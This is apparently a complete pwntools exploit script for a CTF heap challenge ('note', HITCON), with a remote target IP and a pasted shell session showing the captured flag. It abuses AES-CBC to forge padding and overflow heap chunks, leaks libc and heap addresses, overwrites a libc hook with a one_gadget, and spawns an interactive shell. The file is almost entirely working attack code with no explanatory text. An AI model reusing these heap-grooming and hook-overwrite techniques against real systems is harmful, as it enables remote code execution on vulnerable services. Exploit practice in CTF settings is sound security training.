from pwn import *
from Crypto.Cipher import AES

context.log_level='debug'

k = '$#@!zxcvasdfqwer'

#c = process('./note')
c = remote('52.194.203.194', 21700)

pause()

def add(idx,enctype,size,cont):
    c.sendlineafter('exit\n','1')
    c.sendlineafter(':',str(idx))
    c.sendlineafter(':',str(enctype))
    c.sendlineafter(':',str(size))
    c.sendlineafter(':',cont)

def show(idx):
    c.sendlineafter('exit\n','2')
    c.sendlineafter(':',str(idx))

def remove(idx):
    c.sendlineafter('exit\n','3')
    c.sendlineafter(':',str(idx))

add(2, 1, 0x5f, 'a'*0x5f)
show(2)
ct2 = c.recvline().strip().decode('hex')
a = AES.new(key=k, IV='\x00'*16, mode=AES.MODE_CBC)
pt2 = a.decrypt(ct2)
pt = 'a'*16

def doxor(a,b):
    return ''.join(map(lambda (x,y):chr(ord(x)^ord(y)), zip(a,b)))

iv = doxor(pt, pt2[:16])

a0 = AES.new(key=k, mode=AES.MODE_ECB)

def getct10(p, sz):
    assert len(p)==16
    assert sz%16==0
    last = doxor('\x10'*0x10, a0.decrypt(p))
    ct = 'a'*sz+last
    a = AES.new(key=k, IV=iv, mode=AES.MODE_CBC)
    return a.decrypt(ct)

pt = getct10('\x00\x00\x00\x00'+p64(0xf1)+'aaaa', 0x50)
add(3,1,0x60,pt)
for i in range(4,19):
    add(i,1,15,'a'*15)
add(19,1,0x1f,'a'*0x1f)
'''
for i in range(1,8):
    show(2)
'''
remove(2)
cands = range(13,19)+[0]
for j in range(4,12)[::-1]:
    for i in cands:
        remove(i)
    remove(j)
    show(3)
    for i in cands[::-1]:
        if i==14:
            add(i,1,0x11,'a'*0x8+p64(0x61)+'a')
        elif i==13:
            add(i,1,0x41,'a'*0x41)
        else:
            add(i,1,15,'a'*15)
    add(j,1,15,'a'*15)

for j in range(5,13):
    remove(j)
#pause()
show(19)
add(5,1,15,'a'*15)
add(6,1,15,'a'*15)
show(13)
leak = c.recvline().strip().decode('hex')
a = AES.new(key=k, IV=iv, mode=AES.MODE_CBC)
leak = a.decrypt(leak)
libc_base = u64(leak[0x30:0x38])-0x3ebce0
print hex(libc_base)

remove(13)
p = 'a'*0x20+p32(0x100)+p32(1)
add(13,1,len(p),p)

remove(5)
remove(14)
show(6)
leak = c.recvline().strip().decode('hex')
a = AES.new(key=k, IV=iv, mode=AES.MODE_CBC)
leak = a.decrypt(leak)
heap_base = u64(leak[0xb0:0xb8])-0x590
print hex(heap_base)

one = libc_base+0x4f322
#one = libc_base+0x10a38c
some_hook = libc_base+0x3ed8e8
#some_hook = libc_base+0x3ebc30
remove(13)
#pause()
remove(6)
p = 'a'*0x40+p64(some_hook)
add(6,1,len(p),p)


add(7,1,15,'a'*15)
add(8,1,8,p64(one))
remove(1)
#add(9,1,15,'a'*15)

c.interactive()
'''
$ ls -al
total 52
drwxr-x--- 2 nobody note     4096 Oct 18 08:18 .
drwxr-xr-x 4 nobody nogroup  4096 Oct 18 08:06 ..
-rw-r----- 1 nobody note      220 Oct 18 08:06 .bash_logout
-rw-r----- 1 nobody note     3771 Oct 18 08:06 .bashrc
-rw-r----- 1 nobody note      807 Oct 18 08:06 .profile
-rw-r----- 1 nobody note       61 Oct 18 08:09 .very_secret_file_you_need_to_get_shell
-rw-r----- 1 nobody note      310 Oct 18 08:07 N.txt
-rw-r----- 1 nobody note       40 Oct 18 08:07 flag.txt
-rw-r----- 1 nobody note       17 Oct 18 08:07 key.txt
-rwxr-x--- 1 nobody note    15128 Oct 18 08:07 note
$ cat .very_secret_file_you_need_to_get_shell
hitcon{overflow_with_CBC_and_why_calloc_doesnt_use_tcache??}
'''
